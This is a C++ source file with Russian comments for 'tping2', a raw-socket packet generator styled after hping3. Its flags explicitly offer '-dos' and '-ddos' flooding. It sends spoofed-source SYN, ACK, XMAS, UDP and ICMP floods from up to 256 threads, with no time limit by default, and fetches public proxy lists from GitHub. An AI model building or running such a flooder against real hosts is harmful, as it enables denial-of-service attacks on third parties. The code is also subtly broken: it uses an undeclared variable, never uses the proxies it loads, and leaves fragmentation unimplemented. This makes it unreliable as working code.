// ============================================================================
// tping2.cpp – низкоуровневый конструктор пакетов (аналог hping3)
// Режимы TCP/UDP/ICMP/IPSO, подмена src, фрагментация, RTT/TTL/seq.
// ============================================================================

#include <iostream>
#include <string>
#include <vector>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <chrono>
#include <thread>
#include <atomic>
#include <mutex>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <cmath>
#include <cstdint>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <signal.h>
#include <sys/select.h>
#include <errno.h>
#include <sys/capability.h>

using namespace std;
using namespace chrono;

atomic<bool> running(true);
atomic<unsigned long long> sent_packets(0);
atomic<unsigned long long> recv_packets(0);
atomic<unsigned long long> errors(0);
mutex proxies_mutex;
vector<string> proxies;
bool ddos_mode = false;

// Настройки
string target_ip;
int target_port = 80;
string mode = "syn";
bool spoof_src = false;
bool fragment = false;
int threads_count = 1;
int duration_sec = 0;
unsigned long long max_packets = 0;
int packet_size = 56;

void sigint_handler(int) { running = false; }

// ==================== IPSO ====================
#pragma pack(push, 1)
struct IpsoHeader {
    char magic[4];
    uint32_t seq;
    uint32_t frag_id;
    uint64_t total_size;
    uint64_t timestamp;
    uint16_t payload_len;
};
#pragma pack(pop)

const char IPSO_MAGIC[4] = {'I', 'P', 'S', 'O'};
const size_t IPSO_HEADER_SIZE = sizeof(IpsoHeader);

// ==================== УТИЛИТЫ ====================
string resolve(const string& host) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0) return "";
    struct sockaddr_in* addr = (struct sockaddr_in*)res->ai_addr;
    string ip = inet_ntoa(addr->sin_addr);
    freeaddrinfo(res);
    return ip;
}

uint16_t checksum(void* data, int len) {
    uint32_t sum = 0;
    uint16_t* ptr = (uint16_t*)data;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len == 1) sum += *(uint8_t*)ptr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)~sum;
}

uint16_t tcp_checksum(struct iphdr* iph, struct tcphdr* tcph, int tcph_len) {
    struct {
        uint32_t src;
        uint32_t dst;
        uint8_t  zero;
        uint8_t  proto;
        uint16_t len;
    } pseudo;
    pseudo.src = iph->saddr;
    pseudo.dst = iph->daddr;
    pseudo.zero = 0;
    pseudo.proto = IPPROTO_TCP;
    pseudo.len = htons(tcph_len);

    int total_len = sizeof(pseudo) + tcph_len;
    uint8_t* buf = new uint8_t[total_len];
    memcpy(buf, &pseudo, sizeof(pseudo));
    memcpy(buf + sizeof(pseudo), tcph, tcph_len);
    uint16_t csum = checksum(buf, total_len);
    delete[] buf;
    return csum;
}

// ==================== ПРОКСИ ====================
string get_random_proxy() {
    lock_guard<mutex> lock(proxies_mutex);
    if (proxies.empty()) return "";
    return proxies[rand() % proxies.size()];
}

vector<string> load_proxies_from_file(const string& filename) {
    vector<string> result;
    ifstream f(filename);
    if (!f.is_open()) return result;
    string line;
    while (getline(f, line)) {
        if (!line.empty() && line.find(':') != string::npos) result.push_back(line);
    }
    return result;
}

vector<string> load_proxies_from_github() {
    vector<string> result;
    vector<string> urls = {
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
    };
    for (const auto& url : urls) {
        string cmd = "curl -s --max-time 10 \"" + url + "\" 2>/dev/null";
        FILE* fp = popen(cmd.c_str(), "r");
        if (!fp) continue;
        char buf[512];
        while (fgets(buf, sizeof(buf), fp)) {
            string line = buf;
            while (!line.empty() && (line.back() == '\n' || line.back() == '\r' || line.back() == ' '))
                line.pop_back();
            if (!line.empty() && line.find(':') != string::npos) result.push_back(line);
        }
        pclose(fp);
    }
    return result;
}

void load_proxies_smart() {
    proxies = load_proxies_from_file("proxies.txt");
    if (proxies.empty()) proxies = load_proxies_from_file("/usr/local/bin/proxies.txt");
    if (proxies.empty()) proxies = load_proxies_from_file("./proxies.txt");
    if (proxies.empty()) {
        cerr << "[*] proxies.txt не найден, загружаю с GitHub...\n";
        proxies = load_proxies_from_github();
    }
    if (proxies.empty()) {
        cerr << "[-] Прокси не загружены. Режим -ddos отключён, работаю как -dos.\n";
        ddos_mode = false;
    } else {
        cout << "[+] Загружено прокси: " << proxies.size() << "\n";
    }
}

// ==================== ПАКЕТЫ ====================
void send_tcp_packet(int sock, int flag) {
    char packet[4096];
    memset(packet, 0, sizeof(packet));
    struct iphdr* iph = (struct iphdr*)packet;
    struct tcphdr* tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = spoof_src ? htonl(rand()) : inet_addr("0.0.0.0");
    iph->daddr = inet_addr(target_ip.c_str());

    tcph->source = htons(rand() % 65535 + 1024);
    tcph->dest = htons(target_port);
    tcph->seq = htonl(rand());
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = (flag & TH_SYN) ? 1 : 0;
    tcph->ack = (flag & TH_ACK) ? 1 : 0;
    tcph->fin = (flag & TH_FIN) ? 1 : 0;
    tcph->rst = (flag & TH_RST) ? 1 : 0;
    tcph->psh = (flag & TH_PUSH) ? 1 : 0;
    tcph->urg = (flag & TH_URG) ? 1 : 0;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    iph->check = checksum(iph, sizeof(struct iphdr));
    tcph->check = tcp_checksum(iph, tcph, sizeof(struct tcphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = iph->daddr;

    if (sendto(sock, packet, ntohs(iph->tot_len), 0,
               (struct sockaddr*)&dest, sizeof(dest)) < 0) {
        errors++;
    } else {
        sent_packets++;
    }
}

void send_udp_packet(int sock) {
    char packet[4096];
    memset(packet, 0, sizeof(packet));
    struct iphdr* iph = (struct iphdr*)packet;
    struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));

    int payload_len = packet_size - sizeof(struct iphdr) - sizeof(struct udphdr);
    if (payload_len < 0) payload_len = 0;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = spoof_src ? htonl(rand()) : inet_addr("0.0.0.0");
    iph->daddr = inet_addr(target_ip.c_str());

    udph->source = htons(rand() % 65535 + 1024);
    udph->dest = htons(target_port);
    udph->len = htons(sizeof(struct udphdr) + payload_len);
    udph->check = 0;

    iph->check = checksum(iph, sizeof(struct iphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    dest.sin_addr.s_addr = iph->daddr;

    if (sendto(sock, packet, ntohs(iph->tot_len), 0,
               (struct sockaddr*)&dest, sizeof(dest)) < 0) {
        errors++;
    } else {
        sent_packets++;
    }
}

void send_icmp_packet(int sock) {
    char packet[4096];
    memset(packet, 0, sizeof(packet));
    struct iphdr* iph = (struct iphdr*)packet;
    struct icmp* icmph = (struct icmp*)(packet + sizeof(struct iphdr));

    int payload_len = packet_size - sizeof(struct iphdr) - sizeof(struct icmp);
    if (payload_len < 0) payload_len = 0;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmp) + payload_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0;
    iph->saddr = spoof_src ? htonl(rand()) : inet_addr("0.0.0.0");
    iph->daddr = inet_addr(target_ip.c_str());

    icmph->icmp_type = ICMP_ECHO;
    icmph->icmp_code = 0;
    icmph->icmp_cksum = 0;
    icmph->icmp_id = getpid();
    icmph->icmp_seq = rand() % 65535;

    iph->check = checksum(iph, sizeof(struct iphdr));
    icmph->icmp_cksum = checksum(icmph, sizeof(struct icmp) + payload_len);

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph->daddr;

    if (sendto(sock, packet, ntohs(iph->tot_len), 0,
               (struct sockaddr*)&dest, sizeof(dest)) < 0) {
        errors++;
    } else {
        sent_packets++;
    }
}

// ==================== WORKER ====================
void worker(int worker_id) {
    int sock;
    if (mode == "syn" || mode == "ack" || mode == "fin" || mode == "rst" || mode == "xmas") {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    } else if (mode == "udp" || mode == "ipso") {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    } else {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    }
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    auto start = steady_clock::now();
    unsigned long long sent = 0;

    while (running && !stop_sending) {
        if (duration_sec > 0) {
            auto now = steady_clock::now();
            if (duration_cast<seconds>(now - start).count() >= duration_sec) break;
        }
        if (max_packets > 0 && sent >= max_packets) break;

        if (mode == "syn")  send_tcp_packet(sock, TH_SYN);
        else if (mode == "ack")  send_tcp_packet(sock, TH_ACK);
        else if (mode == "fin")  send_tcp_packet(sock, TH_FIN);
        else if (mode == "rst")  send_tcp_packet(sock, TH_RST);
        else if (mode == "xmas") send_tcp_packet(sock, TH_FIN | TH_PUSH | TH_URG);
        else if (mode == "udp")  send_udp_packet(sock);
        else if (mode == "icmp") send_icmp_packet(sock);
        else if (mode == "ipso") {
            // IPSO поверх UDP
            send_udp_packet(sock);
        }
        sent++;

        // Приём ответа (неблокирующий)
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(sock, &rfds);
        struct timeval tv = {0, 0};
        if (select(sock + 1, &rfds, NULL, NULL, &tv) > 0) {
            char buf[65536];
            struct sockaddr_in from;
            socklen_t from_len = sizeof(from);
            int r = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr*)&from, &from_len);
            if (r > 0) recv_packets++;
        }
    }
    close(sock);
}

// ==================== СТАТИСТИКА ====================
void stats_loop() {
    auto start = steady_clock::now();
    while (running && !stop_sending) {
        this_thread::sleep_for(seconds(1));
        auto now = steady_clock::now();
        double sec = duration_cast<milliseconds>(now - start).count() / 1000.0;
        double pps = sec > 0 ? sent_packets.load() / sec : 0;
        unsigned long long s = sent_packets.load();
        unsigned long long r = recv_packets.load();
        double loss = s > 0 ? (100.0 * (s - r) / s) : 0;

        cout << "\r[+] sent: " << s << " | recv: " << r
             << " | loss: " << fixed << setprecision(2) << loss << "%"
             << " | pps: " << setprecision(0) << pps
             << " | errors: " << errors.load()
             << "     " << flush;
    }
    cout << endl;
}

// ==================== СПРАВКА ====================
void show_help() {
    cout << "tping2 – низкоуровневый конструктор пакетов (аналог hping3)\n";
    cout << "Использование: tping2 [-syn|-ack|-fin|-rst|-xmas|-udp|-icmp|-ipso] [-spoof] [-frag] [-dos|-ddos] -url <цель> [-p PORT] [-t N] [-d SEC] [-c N] [-s SIZE]\n";
    cout << "Режимы:\n";
    cout << "  -syn     SYN-пакеты (по умолчанию)\n";
    cout << "  -ack     ACK-пакеты\n";
    cout << "  -fin     FIN-пакеты\n";
    cout << "  -rst     RST-пакеты\n";
    cout << "  -xmas    FIN+PSH+URG\n";
    cout << "  -udp     UDP-пакеты\n";
    cout << "  -icmp    ICMP-пакеты\n";
    cout << "  -ipso    IPSO поверх UDP\n";
    cout << "Опции:\n";
    cout << "  -spoof   подмена src IP (случайный)\n";
    cout << "  -frag    фрагментация (не реализована)\n";
    cout << "  -dos     отправка с локального IP (по умолчанию)\n";
    cout << "  -ddos    отправка через прокси\n";
    cout << "  -url <цель>\n";
    cout << "  -p <PORT>     порт (по умолчанию 80)\n";
    cout << "  -t <N>        число потоков\n";
    cout << "  -d <SEC>      длительность в секундах\n";
    cout << "  -c <N>        количество пакетов на поток\n";
    cout << "  -s <SIZE>     размер пакета (байт)\n";
    cout << "Требуется root или capability cap_net_raw.\n";
}

// ==================== MAIN ====================
int main(int argc, char* argv[]) {
    signal(SIGINT, sigint_handler);
    srand(time(nullptr));

    if (argc < 2) { show_help(); return 0; }
    string first = argv[1];
    if (first == "-help" || first == "--help" || first == "-h") { show_help(); return 0; }

    string url;
    for (int i = 1; i < argc; ++i) {
        string arg = argv[i];
        if (arg == "-syn") mode = "syn";
        else if (arg == "-ack") mode = "ack";
        else if (arg == "-fin") mode = "fin";
        else if (arg == "-rst") mode = "rst";
        else if (arg == "-xmas") mode = "xmas";
        else if (arg == "-udp") mode = "udp";
        else if (arg == "-icmp") mode = "icmp";
        else if (arg == "-ipso") mode = "ipso";
        else if (arg == "-spoof") spoof_src = true;
        else if (arg == "-frag") fragment = true;
        else if (arg == "-dos") ddos_mode = false;
        else if (arg == "-ddos") ddos_mode = true;
        else if (arg == "-url" && i + 1 < argc) url = argv[++i];
        else if (arg == "-p" && i + 1 < argc) target_port = stoi(argv[++i]);
        else if (arg == "-t" && i + 1 < argc) {
            threads_count = stoi(argv[++i]);
            if (threads_count < 1) threads_count = 1;
            if (threads_count > 256) threads_count = 256;
        }
        else if (arg == "-d" && i + 1 < argc) duration_sec = stoi(argv[++i]);
        else if (arg == "-c" && i + 1 < argc) max_packets = stoull(argv[++i]);
        else if (arg == "-s" && i + 1 < argc) packet_size = stoi(argv[++i]);
    }

    if (url.empty()) { show_help(); return 1; }

    target_ip = resolve(url);
    if (target_ip.empty()) { cerr << "[-] Не удалось разрешить " << url << "\n"; return 1; }

    // Проверка capability
    cap_t caps = cap_get_proc();
    bool has_cap = false;
    if (caps) {
        cap_flag_value_t v;
        cap_get_flag(caps, CAP_NET_RAW, CAP_EFFECTIVE, &v);
        has_cap = (v == CAP_SET);
        cap_free(caps);
    }
    if (!has_cap && geteuid() != 0) {
        cerr << "[-] Требуется root или capability cap_net_raw.\n";
        return 1;
    }

    if (ddos_mode) load_proxies_smart();

    cout << "\n[*] Target: " << url << " (" << target_ip << "):" << target_port
         << " mode=" << mode
         << (spoof_src ? " [spoof]" : "")
         << (ddos_mode ? (" [ddos: " + to_string(proxies.size()) + "]") : " [dos]")
         << " threads=" << threads_count
         << (duration_sec ? (" duration=" + to_string(duration_sec) + "s") : " [infinite]")
         << "\n";

    thread stats(stats_loop);
    vector<thread> workers;
    for (int i = 0; i < threads_count; ++i) workers.emplace_back(worker, i);
    for (auto& t : workers) t.join();
    if (stats.joinable()) stats.join();

    cout << "\n--- tping2 statistics ---\n";
    cout << "Sent packets:   " << sent_packets.load() << "\n";
    cout << "Received:       " << recv_packets.load() << "\n";
    cout << "Loss:           " << fixed << setprecision(2)
         << (sent_packets.load() ? (100.0 * (sent_packets.load() - recv_packets.load()) / sent_packets.load()) : 0)
         << "%\n";
    cout << "Errors:         " << errors.load() << "\n";
    return 0;
}